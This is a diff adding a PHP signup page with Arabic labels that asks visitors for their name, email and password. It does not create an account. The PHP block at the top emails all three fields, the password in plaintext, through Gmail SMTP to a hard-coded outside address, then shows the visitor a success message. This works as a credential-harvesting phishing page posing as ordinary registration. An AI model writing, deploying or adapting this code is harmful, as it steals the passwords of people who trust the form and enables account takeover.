@@ -1,0 +1,69 @@
+<?php
+use PHPMailer\PHPMailer\PHPMailer;
+use PHPMailer\PHPMailer\Exception;
+
+require 'vendor/autoload.php'; // تأكد من أن مسار autoload.php صحيح
+
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    $name = $_POST['name'];
+    $email = $_POST['email'];
+    $password = $_POST['password'];
+
+    $mail = new PHPMailer(true);
+    
+    try {
+        // إعدادات الخادم
+        $mail->isSMTP();
+        $mail->Host = 'smtp.gmail.com'; // عنوان SMTP الخاص بـ Gmail
+        $mail->SMTPAuth = true;
+        $mail->Username = 'your-email@gmail.com'; // استبدل هذا بعنوان بريدك الإلكتروني
+        $mail->Password = 'your-email-password'; // استبدل هذا بكلمة مرور بريدك الإلكتروني
+        $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
+        $mail->Port = 587;
+
+        // إعدادات البريد
+        $mail->setFrom('1juin2003@gmail.com', 'اسمك'); // استبدل هذا بعنوان بريدك الإلكتروني
+        $mail->addAddress('alphador213@gmail.com'); // عنوان البريد الذي سيتم إرسال المعلومات إليه
+
+        $mail->isHTML(true);
+        $mail->Subject = 'معلومات التسجيل';
+        $mail->Body = "الاسم: $name<br>البريد الإلكتروني: $email<br>كلمة المرور: $password";
+
+        $mail->send();
+        $successMessage = "تم إرسال معلومات التسجيل بنجاح.";
+    } catch (Exception $e) {
+        $errorMessage = "فشل في إرسال البريد الإلكتروني. الخطأ: {$mail->ErrorInfo}";
+    }
+}
+?>
+
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>صفحة التسجيل</title>
+</head>
+<body>
+    <h2>تسجيل حساب جديد</h2>
+    
+    <?php if (isset($successMessage)): ?>
+        <p style="color: green;"><?php echo $successMessage; ?></p>
+    <?php elseif (isset($errorMessage)): ?>
+        <p style="color: red;"><?php echo $errorMessage; ?></p>
+    <?php endif; ?>
+
+    <form id="registrationForm" method="post" action="">
+        <label for="name">الاسم:</label><br>
+        <input type="text" id="name" name="name" required><br>
+        
+        <label for="email">البريد الإلكتروني:</label><br>
+        <input type="email" id="email" name="email" required><br>
+        
+        <label for="password">كلمة المرور:</label><br>
+        <input type="password" id="password" name="password" required><br>
+        
+        <input type="submit" value="تسجيل">
+    </form>
+</body>
+</html>
